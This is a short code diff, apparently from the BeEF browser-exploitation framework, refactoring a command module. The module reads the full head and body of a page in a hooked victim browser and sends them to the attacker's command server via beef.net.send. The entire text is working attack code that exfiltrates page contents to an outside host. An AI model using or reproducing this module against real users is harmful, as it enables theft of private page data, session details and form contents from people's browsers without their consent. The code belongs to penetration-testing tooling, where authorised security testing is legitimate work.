@@ -5,8 +5,10 @@
 //
 
 beef.execute(function() {
-
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+beef.browser.getPageHead()+'&body='+beef.browser.getPageBody());
-
+	var head = beef.browser.getPageHead();
+	var body = beef.browser.getPageBody();
+	var mod_data = 'head=' + head + '&body=' + body;
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, mod_data, beef.are.status_success());
+	return [beef.are.status_success(), mod_data];
 });
 
